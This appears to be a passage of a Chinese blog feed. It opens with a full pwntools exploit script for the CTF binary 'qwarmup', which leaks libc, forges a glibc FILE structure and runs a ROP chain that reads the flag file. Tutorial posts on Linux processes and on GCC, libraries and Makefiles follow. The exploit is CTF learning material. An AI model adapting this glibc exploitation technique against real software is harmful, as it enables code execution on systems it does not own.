class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> random<br><br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br>binary = <span class="hljs-string">&#x27;./qwarmup&#x27;</span><br>local = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> local:<br>p = process(binary)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>p = remote(<span class="hljs-string">&#x27;&#x27;</span>, )<br>libc = ELF(<span class="hljs-string">&#x27;libc.so.6&#x27;</span>)<br><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">convert</span>(<span class="hljs-params">index</span>):</span><br><span class="hljs-keyword">if</span> index &gt;= <span class="hljs-number">0</span>:<br><span class="hljs-keyword">return</span> index<br><span class="hljs-keyword">else</span>:<br><span class="hljs-keyword">return</span> (<span class="hljs-number">0xffffffffffffffff</span> + index + <span class="hljs-number">1</span>)<br><br><br><br><span class="hljs-comment"># pause()</span><br><span class="hljs-comment"># setvbuf-90 alarm-50 malloc-80 prctl-70 read-60 write-30</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exp</span>():</span><br><span class="hljs-comment"># distance = 0x1000</span><br>gdb.attach(p)<span class="hljs-comment">#, &#x27;b *$rebase(0x145a)&#x27;)</span><br>distance = <span class="hljs-number">0x1000</span><span class="hljs-comment">#random.randint(0, 0x1000) * 0x1000</span><br>success(<span class="hljs-string">&#x27;distance -&gt; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(distance)))<br><span class="hljs-comment"># change write</span><br><br>p.send(p32(<span class="hljs-number">0x100</span>))<br>p.send(p64(convert(-<span class="hljs-number">0x2c0</span>-distance+<span class="hljs-number">0x18</span>)))<br>p.send(p8(<span class="hljs-number">0x80</span>))<br><br><span class="hljs-comment"># change exit 0x1436 0x1474</span><br>main = p16(<span class="hljs-number">0x5436</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>):<br>p.send(p64(convert(-<span class="hljs-number">0x2c0</span>-distance+<span class="hljs-number">0x50</span>+i)))<br>p.send(p8(main[i]))<br><br><span class="hljs-comment"># change write</span><br>p.send(p64(convert(-<span class="hljs-number">0x2c0</span>-distance+<span class="hljs-number">0x19</span>)))<br>p.send(p8(<span class="hljs-number">0x54</span>))<br>p.send(p64(convert(<span class="hljs-number">0</span>)))<br>p.send(p8(<span class="hljs-number">0</span>))<br>p.send(p64(convert(-<span class="hljs-number">0x2c0</span>-distance+<span class="hljs-number">0x18</span>)))<br>p.send(p8(<span class="hljs-number">0xe9</span>))<br><br><br><span class="hljs-comment"># # change io_stdout 0x23f770</span><br>payload = p64(<span class="hljs-number">0xfbad3887</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p16(<span class="hljs-number">0</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(payload)):<br>p.send(p32(<span class="hljs-number">0x21000</span>))<br>p.send(p64(<span class="hljs-number">0x23f770</span>+<span class="hljs-number">0x22001</span>*i))<br>p.send(p8(payload[i]))<br><br><br>p.send(p32(<span class="hljs-number">0x100</span>))<br>p.send(p64(convert(-<span class="hljs-number">0x430</span>-distance+<span class="hljs-number">0x18</span>)))<br>p.send(p8(<span class="hljs-number">0x80</span>))<br><br>p.send(p64(convert(-<span class="hljs-number">0x430</span>-distance+<span class="hljs-number">0x28</span>)))<br>p.send(p8(<span class="hljs-number">0xc3</span>))<br>p.send(p64(convert(-<span class="hljs-number">0x430</span>-distance+<span class="hljs-number">0x38</span>)))<br>p.send(p8(<span class="hljs-number">0xd1</span>))<br>p.send(p64(convert(<span class="hljs-number">0</span>)))<br>p.send(p8(<span class="hljs-number">0</span>))<br>p.send(p64(convert(-<span class="hljs-number">0x430</span>-distance+<span class="hljs-number">0x19</span>)))<br>p.send(p8(<span class="hljs-number">0x51</span>))<br>p.send(p64(convert(-<span class="hljs-number">0x430</span>-distance+<span class="hljs-number">0x18</span>)))<br>p.send(p8(<span class="hljs-number">0x40</span>))<br><br>libc_base = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x10</span>):<br>libc_base = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>p.recv(timeout=<span class="hljs-number">0.2</span>)<br>libc_base -= <span class="hljs-number">0x1baf80</span><br>success(<span class="hljs-string">&#x27;libc_base -&gt; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(libc_base)))<br>io_cookie_jumps_addr = libc_base + <span class="hljs-number">0x215b80</span><br><span class="hljs-comment">#mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]</span><br>gadget = libc_base + <span class="hljs-number">0x00000000001675b0</span> <br><br>p.send(p32(<span class="hljs-number">0x100</span>))<br>p.send(p64(convert(-<span class="hljs-number">0x560</span>-distance+<span class="hljs-number">0x18</span>)))<br>p.send(p8(<span class="hljs-number">0x80</span>))<br>p.send(p64(convert(-<span class="hljs-number">0x560</span>-distance+<span class="hljs-number">0x19</span>)))<br>p.send(p8(<span class="hljs-number">0x54</span>))<br>p.send(p64(convert(<span class="hljs-number">0</span>)))<br>p.send(p8(<span class="hljs-number">0</span>))<br>p.send(p64(convert(-<span class="hljs-number">0x560</span>-distance+<span class="hljs-number">0x18</span>)))<br>p.send(p8(<span class="hljs-number">0xe9</span>))<br><br><span class="hljs-comment"># pause()# 0x7ffff78d6010 0x4a8ff0</span><br>heap_base = libc_base - <span class="hljs-number">0x4a8ff0</span><br>stderr = libc_base + libc.sym[<span class="hljs-string">&#x27;stderr&#x27;</span>]<br>pointer_guard = libc_base - <span class="hljs-number">0x2890</span><br>payload = p64(heap_base)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>p.send(p32(<span class="hljs-number">0x21000</span>))<br>p.send(p64(stderr-heap_base+<span class="hljs-number">0x22001</span>*i))<br>p.send(p8(payload[i]))<br>success(<span class="hljs-string">&#x27;pointer_guard -&gt; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(pointer_guard)))<br>success(<span class="hljs-string">&#x27;heap_base -&gt; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(heap_base)))<br>heap_base = libc_base - <span class="hljs-number">0x5b8ff0</span><br><span class="hljs-comment"># pause()</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>p.send(p32(<span class="hljs-number">0x21000</span>))<br>p.send(p64(pointer_guard-heap_base+<span class="hljs-number">0x22001</span>*i))<br>p.send(p8(payload[i]))<br><br>payload = u64(payload)<br>fake_FILE = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> <span class="hljs-comment">#_IO_read_end _IO_read_base</span><br>fake_FILE += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># _IO_write_base</span><br>fake_FILE += p64(<span class="hljs-number">0xffffffffffffffff</span>) <span class="hljs-comment">#_IO_write_ptr</span><br>fake_FILE += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> <span class="hljs-comment">#_IO_write_end _IO_buf_base _IO_buf_end</span><br>fake_FILE = fake_FILE.ljust(<span class="hljs-number">0x58</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_FILE += p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#chain</span><br>fake_FILE = fake_FILE.ljust(<span class="hljs-number">0x78</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_FILE += p64(libc_base+<span class="hljs-number">0x21ba60</span>) <span class="hljs-comment">#_lock=writable_addr</span><br>fake_FILE = fake_FILE.ljust(<span class="hljs-number">0xb0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_FILE += p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#_mode=0</span><br>fake_FILE =fake_FILE.ljust(<span class="hljs-number">0xc8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_FILE += p64(io_cookie_jumps_addr+<span class="hljs-number">0x18</span>) <span class="hljs-comment">#vtable</span><br>fake_FILE += p64(payload+<span class="hljs-number">0x100</span>) <span class="hljs-comment">#rdi</span><br>fake_FILE += p64(<span class="hljs-number">0</span>)<br>enc = ((gadget^(payload))&gt;&gt;(<span class="hljs-number">64</span>-<span class="hljs-number">0x11</span>))|((gadget^(payload))&lt;&lt;<span class="hljs-number">0x11</span>)<br>fake_FILE += p64(enc)<br>fake_FILE = <span class="hljs-string">b&#x27;./flag\x00&#x27;</span>.ljust(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + fake_FILE<br>pop_rdi_ret = libc_base + <span class="hljs-number">0x000000000002a3e5</span><br>pop_rsi_ret = libc_base + <span class="hljs-number">0x000000000002be51</span><br>pop_rdx_ret = libc_base + <span class="hljs-number">0x000000000011f497</span><br>pop_rax_ret = libc_base + <span class="hljs-number">0x0000000000045eb0</span><br>ret = libc_base + <span class="hljs-number">0x0000000000029cd6</span><br>Read = libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>Write = libc_base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>close = libc_base + libc.sym[<span class="hljs-string">&#x27;close&#x27;</span>]<br>syscall = Read + <span class="hljs-number">0x10</span><br>setcontext = libc_base + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br><br>orw = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> + p64(payload+<span class="hljs-number">0x100</span>)<br>orw += <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x10</span><br>orw += p64(setcontext+<span class="hljs-number">61</span>)<br>orw += <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x78</span><br>orw += p64(payload+<span class="hljs-number">0x1b0</span>) + p64(ret)<br><br>orw += p64(pop_rdi_ret) + p64(payload)<br>orw += p64(pop_rsi_ret) + p64(<span class="hljs-number">0</span>)<br>orw += p64(pop_rax_ret) + p64(<span class="hljs-number">2</span>)<br>orw += p64(syscall)<br>orw += p64(pop_rdi_ret) + p64(<span class="hljs-number">3</span>)<br>orw += p64(pop_rsi_ret) + p64(payload)<br>orw += p64(pop_rdx_ret) + p64(<span class="hljs-number">0x41</span>)*<span class="hljs-number">2</span><br>orw += p64(Read)<br>orw += p64(pop_rdi_ret) + p64(<span class="hljs-number">1</span>)<br>orw += p64(Write)<br><br>fake_FILE += orw<br><br><span class="hljs-comment"># pause()</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(fake_FILE)):<br>p.send(p32(<span class="hljs-number">0x21000</span>))<br>p.send(p64(convert(<span class="hljs-number">0x220000</span>+<span class="hljs-number">0x22001</span>*i)))<br>p.send(p8(fake_FILE[i]))<br><br><br>p.send(p32(<span class="hljs-number">0x100</span>))<br>p.send(p64(convert(-<span class="hljs-number">0x670</span>-distance+<span class="hljs-number">0x18</span>)))<br>p.send(p8(<span class="hljs-number">0x80</span>))<br>p.send(p64(convert(<span class="hljs-number">0x108</span>)))<br>p.send(p8(<span class="hljs-number">0</span>))<br>p.send(p64(convert(<span class="hljs-number">0x10a</span>)))<br>p.send(p8(<span class="hljs-number">0</span>))<br>p.send(p64(convert(<span class="hljs-number">0</span>)))<br>p.send(p8(<span class="hljs-number">0</span>))<br>p.send(p64(convert(-<span class="hljs-number">0x670</span>-distance+<span class="hljs-number">0x18</span>)))<br>p.send(p8(<span class="hljs-number">0xe9</span>))<br><br><span class="hljs-comment"># pause()</span><br>p.send(p32(<span class="hljs-number">0x1000</span>))<br>p.interactive()<br><br>exp()<br><span class="hljs-comment"># if __name__ == &#x27;__main__&#x27;:</span><br><span class="hljs-comment">#     while True:</span><br><span class="hljs-comment">#         try:</span><br><span class="hljs-comment">#             local = 1</span><br><span class="hljs-comment">#             if local:</span><br><span class="hljs-comment">#                 p = process(binary)</span><br><span class="hljs-comment">#                 libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br><span class="hljs-comment">#             else:</span><br><span class="hljs-comment">#                 p = remote(&#x27;121.40.213.105&#x27;, 12001)</span><br><span class="hljs-comment">#                 libc = ELF(&#x27;libc.so.6&#x27;)</span><br><span class="hljs-comment">#             exp()</span><br><span class="hljs-comment">#             break</span><br><span class="hljs-comment">#         except:</span><br><span class="hljs-comment">#             p.close()</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux 多进程开发</title>
    <link href="/2022/06/12/Linux-%E5%A4%9A%E8%BF%9B%E7%A8%8B%E5%BC%80%E5%8F%91/"/>
    <url>/2022/06/12/Linux-%E5%A4%9A%E8%BF%9B%E7%A8%8B%E5%BC%80%E5%8F%91/</url>
    
    <content type="html"><![CDATA[<h2 id="进程概述"><a href="#进程概述" class="headerlink" title="进程概述"></a>进程概述</h2><h3 id="程序和进程"><a href="#程序和进程" class="headerlink" title="程序和进程"></a>程序和进程</h3><p>程序是包含一系列信息的文件，这些信息描述了如何在运行时创建一个进程：</p><ul><li><p>二进制格式标识：每个程序文件都包含用于描述可执行文件格式的元信息。内核利用此信息来解释文件中的其他信息。（ELF可执行连接格式）</p></li><li><p>机器语言指令：对程序算法进行编码。</p></li><li><p>程序入口地址：标识程序开始执行时的起始指令位置。</p></li><li><p>数据：程序文件包含的变量初始值和程序使用的字面量值（比如字符串）。</p></li><li><p>符号表及重定位表：描述程序中函数和变量的位置及名称。这些表格有多重用途，其中包括调试和运行时的符号解析（动态链接）。</p></li><li><p>共享库和动态链接信息：程序文件所包含的一些字段，列出了程序运行时需要使用的共享库，以及加载共享库的动态连接器的路径名。</p></li><li><p>其他信息：程序文件还包含许多其他信息，用以描述如何创建进程。</p></li><li><p>进程是正在运行的程序的实例。是一个具有一定独立功能的程序关于某个数据集合的一次运行活动。它是操作系统动态执行的基本单元，在传统的操作系统中，进程既是基本的分配单元，也是基本的执行单元。</p></li><li><p>可以用一个程序来创建多个进程，进程是由内核定义的抽象实体，并为该实体分配用以执行程序的各项系统资源。从内核的角度看，进程由用户内存空间和一系列内核数据结构组成，其中用户内存空间包含了程序代码及代码所使用的变量，而内核数据结构则用于维护进程状态信息。记录在内核数据结构中的信息包括许多与进程相关的标识号（IDs）、虚拟内存表、打开文件的描述符表、信号传递及处理的有关信息、进程资源使用及限制、当前工作目录和大量的其他信息。</p></li></ul><h3 id="单道、多道程序设计"><a href="#单道、多道程序设计" class="headerlink" title="单道、多道程序设计"></a>单道、多道程序设计</h3><ul><li><p>单道程序，即在计算机内存中只允许一个的程序运行。</p></li><li><p>多道程序设计技术是在计算机内存中同时存放几道相互独立的程序，使它们在管理程序控制下，相互穿插运行，两个或两个以上程序在计算机系统中同处于开始到结束之间的状态, 这些程序共享计算机系统资源。引入多道程序设计技术的根本目的是为了提高 CPU 的利用率。</p></li><li><p>对于一个单 CPU 系统来说，程序同时处于运行状态只是一种宏观上的概念，他们虽然都已经开始运行，但就微观而言，任意时刻，CPU 上运行的程序只有一个。</p></li><li><p>在多道程序设计模型中，多个进程轮流使用 CPU。而当下常见 CPU 为纳秒级，1秒可以执行大约 10 亿条指令。由于人眼的反应速度是毫秒级，所以看似同时在运行。</p></li></ul><h3 id="时间片"><a href="#时间片" class="headerlink" title="时间片"></a>时间片</h3><ul><li><p>时间片（timeslice）又称为“量子（quantum）”或“处理器片（processor slice）”是操作系统分配给每个正在运行的进程微观上的一段 CPU 时间。事实上，虽然一台计算机通常可能有多个 CPU，但是同一个 CPU 永远不可能真正地同时运行多个任务。在只考虑一个 CPU 的情况下，这些进程“看起来像”同时运行的，实则是轮番穿插地运行，由于时间片通常很短（在 Linux 上为 5ms－800ms），用户不会感觉到。</p></li><li><p>时间片由操作系统内核的调度程序分配给每个进程。首先，内核会给每个进程分配相等的初始时间片，然后每个进程轮番地执行相应的时间，当所有进程都处于时间片耗尽的状态时，内核会重新为每个进程计算并分配时间片，如此往复。</p></li></ul><h3 id="并行和并发"><a href="#并行和并发" class="headerlink" title="并行和并发"></a>并行和并发</h3><ul><li><p>并行(parallel)：指在同一时刻，有多条指令在多个处理器上同时执行。</p></li><li><p>并发(concurrency)：指在同一时刻只能有一条指令执行，但多个进程指令被快速的轮换执行，使得在宏观上具有多个进程同时执行的效果，但在微观上并不是同时执行的，只是把时间分成若干段，使多个进程快速交替的执行。</p></li></ul><p><img src="https://s2.loli.net/2022/06/12/DBi74yntJ1dOF5U.png"></p><p><img src="https://s2.loli.net/2022/06/12/Zk2rm6ocV4eKvwD.png"></p><ul><li><p>并发是两个队列交替使用一台咖啡机。</p></li><li><p>并行是两个队列同时使用两台咖啡机。</p></li></ul><p><img src="https://s2.loli.net/2022/06/12/e96FTQ7lCokpP2t.png"></p><h3 id="进程控制块（PCB）"><a href="#进程控制块（PCB）" class="headerlink" title="进程控制块（PCB）"></a>进程控制块（PCB）</h3><ul><li><p>为了管理进程，内核必须对每个进程所做的事情进行清楚的描述。内核为每个进程分配一个 PCB(Processing Control Block)进程控制块，维护进程相关的信息，Linux 内核的进程控制块是 task_struct 结构体。</p></li><li><p>在 /usr/src/linux-headers-xxx/include/linux/sched.h 文件中可以查看 struct task_struct 结构体定义。其内部成员有很多，我们只需要掌握以下部分即可：</p><ul><li>进程id：系统中每个进程有唯一的 id，用 pid_t 类型表示，其实就是一个非负整数</li><li>进程的状态：有就绪、运行、挂起、停止等状态</li><li>进程切换时需要保存和恢复的一些CPU寄存器</li><li>描述虚拟地址空间的信息</li><li>描述控制终端的信息</li></ul></li><li><p>当前工作目录（Current Working Directory）</p></li><li><p>umask 掩码</p></li><li><p>文件描述符表，包含很多指向 file 结构体的指针</p></li><li><p>和信号相关的信息</p></li><li><p>用户 id 和组 id</p></li><li><p>会话（Session）和进程组</p></li><li><p>进程可以使用的资源上限（Resource Limit）</p></li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux C开发基础</title>
    <link href="/2022/06/12/Linux-C%E5%BC%80%E5%8F%91%E5%9F%BA%E7%A1%80/"/>
    <url>/2022/06/12/Linux-C%E5%BC%80%E5%8F%91%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h2 id="GCC"><a href="#GCC" class="headerlink" title="GCC"></a>GCC</h2><h3 id="gcc简介"><a href="#gcc简介" class="headerlink" title="gcc简介"></a>gcc简介</h3><ul><li><p>GCC 原名为 GNU C语言编译器（GNU C Compiler）</p></li><li><p>GCC（GNU Compiler Collection，GNU编译器套件）是由 GNU 开发的编程语言 译器。GNU 编译器套件包括 C、C++、Objective-C、Java、Ada 和 Go 语言前 端，也包括了这些语言的库（如 libstdc++，libgcj等） </p></li><li><p>GCC 不仅支持 C 的许多“方言”，也可以区别不同的 C 语言标准；可以使用命令行 选项来控制编译器在翻译源代码时应该遵循哪个 C 标准。例如，当使用命令行参数 <code>-std=c99</code> 启动 GCC 时，编译器支持 C99 标准。 </p></li><li><p>安装命令 sudo apt install gcc g++ （版本 &gt; 4.8.5） </p></li><li><p>查看版本 gcc/g++ -v/–version</p></li></ul><h3 id="gcc工作流程"><a href="#gcc工作流程" class="headerlink" title="gcc工作流程"></a>gcc工作流程</h3><p><img src="https://s2.loli.net/2022/06/12/CLAxOBf3ZMihDEV.png"></p><h3 id="gcc和g-的区别"><a href="#gcc和g-的区别" class="headerlink" title="gcc和g++的区别"></a>gcc和g++的区别</h3><ul><li><p>gcc 和 g++都是GNU(组织)的一个编译器。 </p></li><li><p>误区一：gcc 只能编译 c 代码，g++ 只能编译 c++ 代码。两者都可以，请注意： <strong>后缀为 .c 的，gcc 把它当作是 C 程序，而 g++ 当作是 c++ 程序</strong>。 <strong>后缀为 .cpp 的，两者都会认为是 C++ 程序</strong>，C++ 的语法规则更加严谨一些。 编译阶段，g++ 会调用 gcc，对于 C++ 代码，两者是等价的，但是因为 gcc 命令不能自动和 C++ 程序使用的库联接，所以通常用 g++ 来完成链接，为了统 一起见，干脆编译/链接统统用 g++ 了，这就给人一种错觉，好像 cpp 程序只 能用 g++ 似的</p></li><li><p>误区二：gcc 不会定义 __cplusplus 宏，而 g++ 会。 实际上，这个宏只是标志着编译器将会把代码按 C 还是 C++ 语法来解释 。 如上所述，如果后缀为 .c，并且采用 gcc 编译器，则该宏就是未定义的，否则， 就是已定义 </p></li><li><p>误区三：编译只能用 gcc，链接只能用 g++ 。 严格来说，这句话不算错误，但是它混淆了概念，应该这样说：编译可以用 gcc/g++，而链接可以用 g++ 或者 gcc -lstdc++。  gcc 命令不能自动和C++程序使用的库联接，所以通常使用 g++ 来完成联接。 但在编译阶段，g++ 会自动调用 gcc，二者等价</p></li></ul><h3 id="gcc常用参数选项"><a href="#gcc常用参数选项" class="headerlink" title="gcc常用参数选项"></a>gcc常用参数选项</h3><table><thead><tr><th align="left">gcc编译选项</th><th>说明</th></tr></thead><tbody><tr><td align="left">-E</td><td>预处理指定的源文件，不进行编译</td></tr><tr><td align="left">-S</td><td>编译指定的源文件，但是不进行汇编</td></tr><tr><td align="left">-c</td><td>编译、汇编指定的源文件，但是不进行链接</td></tr><tr><td align="left">-o [file1] [file2] /  [file2] -o [file1]</td><td>将文件 file2 编译成可执行文件 file1</td></tr><tr><td align="left">-I directory</td><td>指定 include 包含文件的搜索目录</td></tr><tr><td align="left">-g</td><td>在编译的时候，生成调试信息，该程序可以被调试器调试</td></tr><tr><td align="left">-D</td><td>在程序编译的时候，指定一个宏</td></tr><tr><td align="left">-w</td><td>不生成任何警告信息</td></tr><tr><td align="left">-Wall</td><td>生成所有警告信息</td></tr><tr><td align="left">-On</td><td>开启编译优化，-O0表 示没有优化，-O1为缺省值，-O3优化级别最高</td></tr><tr><td align="left">-l</td><td>在程序编译的时候，指定使用的库</td></tr><tr><td align="left">-L</td><td>指定编译的时候，搜索的库的路径。</td></tr><tr><td align="left">-fPIC/fpic</td><td>生成与位置无关的代码</td></tr><tr><td align="left">-shared</td><td>生成共享目标文件，通常用在建立共享库时</td></tr><tr><td align="left">-std</td><td>指定C方言，如:-std=c99，gcc默认的方言是GNU C</td></tr></tbody></table><h2 id="静态库制作"><a href="#静态库制作" class="headerlink" title="静态库制作"></a>静态库制作</h2><h3 id="命名规则"><a href="#命名规则" class="headerlink" title="命名规则"></a>命名规则</h3><ul><li><p>Linux : libxxx.a </p><p>​    lib : 前缀（固定） </p><p>​    xxx : 库的名字，自己起 </p><p>​    .a : 后缀（固定）</p></li><li><p> Windows : </p></li></ul><p>  ​    libxxx.lib</p><h3 id="制作方法"><a href="#制作方法" class="headerlink" title="制作方法"></a>制作方法</h3><ul><li><p>gcc 获得 .o 文件</p></li><li><p>将 .o 文件打包，使用 ar 工具（archive）</p><p><code>ar rcs libxxx.a xxx.o xxx.o</code></p><p>r – 将文件插入备存文件中 </p><p>c – 建立备存文件 </p><p>s – 索引</p></li></ul><h2 id="动态库制作"><a href="#动态库制作" class="headerlink" title="动态库制作"></a>动态库制作</h2><p>当系统加载可执行代码时候，能够知道其所依赖的库的名字，但是还需要知道绝对路径。此时就需要系统的动态载入器来获取该绝对路径。对于elf格式的可执行程序，是由ld-linux.so来完成的，它先后搜索elf文件的 DT_RPATH段 ——&gt; 环境变量 LD_LIBRARY_PATH ——&gt; /etc/ld.so.cache文件列表 ——&gt; /lib/，/usr/lib 目录找到库文件后将其载入内存。</p><h3 id="命名规则-1"><a href="#命名规则-1" class="headerlink" title="命名规则"></a>命名规则</h3><ul><li><p>Linux : libxxx.so</p><p>​    lib : 前缀（固定） </p><p>​    xxx : 库的名字，自己起 </p><p>​    .so : 后缀（固定）</p><p>​    在Linux下是一个可执行文件</p></li><li><p> Windows : </p></li></ul><p>  libxxx.dll</p><h3 id="制作方法-1"><a href="#制作方法-1" class="headerlink" title="制作方法"></a>制作方法</h3><ul><li><p>gcc 得到 .o 文件，得到和位置无关的代码</p><p><code>gcc -c –fpic/-fPIC a.c b.c</code></p></li><li><p>gcc 得到动态库</p><p><code>gcc -shared a.o b.o -o libcalc.so</code></p></li></ul><h2 id="Makefile"><a href="#Makefile" class="headerlink" title="Makefile"></a>Makefile</h2><h3 id="规则和工作原理"><a href="#规则和工作原理" class="headerlink" title="规则和工作原理"></a>规则和工作原理</h3><ul><li><p>一个 Makefile 文件中可以有一个或者多个规则 </p><p>目标 …: 依赖 … </p><p>​    命令（Shell 命令） … </p><ul><li><p>目标：最终要生成的文件（伪目标除外） </p></li><li><p>依赖：生成目标所需要的文件或是目标 </p></li><li><p>命令：通过执行命令对依赖操作生成目标（命令前必须 Tab 缩进）</p></li></ul></li><li><p>Makefile 中的其它规则一般都是为第一条规则服务的。</p></li><li><p>命令在执行之前，需要先检查规则中的依赖是否存在</p><ul><li>如果存在，执行命令</li><li>如果不存在，向下检查其它的规则，检查有没有一个规则是用来生成这个依赖的， 如果找到了，则执行该规则中的命令</li></ul></li><li><p>检测更新，在执行规则中的命令时，会比较目标和依赖文件的时间</p><ul><li>如果依赖的时间比目标的时间晚，需要重新生成目标</li><li>如果依赖的时间比目标的时间早，目标不需要更新，对应规则中的命令不需要被 执行</li></ul></li></ul><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><ul><li><p>自定义变量</p><p>变量名=变量值 var=hello    $获取变量的值，$(变量名)</p></li><li><p>预定义变量</p><ul><li><p>AR : 归档维护程序的名称，默认值为 ar</p></li><li><p>CC : C 编译器的名称，默认值为 cc</p></li><li><p>CXX : C++ 编译器的名称，默认值为 g++</p></li><li><p>$@ : 目标的完整名称</p></li><li><p>$&lt; : 第一个依赖文件的名称</p></li><li><p>$^ : 所有的依赖文件</p></li></ul></li></ul><blockquote><p>示例</p></blockquote><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">app:main.c a.c b.c </span><br>gcc -c main.c a.c b.c<br><br><span class="hljs-section">app:main.c a.c b.c</span><br><span class="hljs-variable">$(CC)</span> -c <span class="hljs-variable">$^</span> -o <span class="hljs-variable">$@</span><br></code></pre></td></tr></table></figure><h3 id="模式匹配"><a href="#模式匹配" class="headerlink" title="模式匹配"></a>模式匹配</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">add.o:add.c</span><br>gcc -c add.c<br><span class="hljs-section">div.o:div.c</span><br>gcc -c div.c<br><span 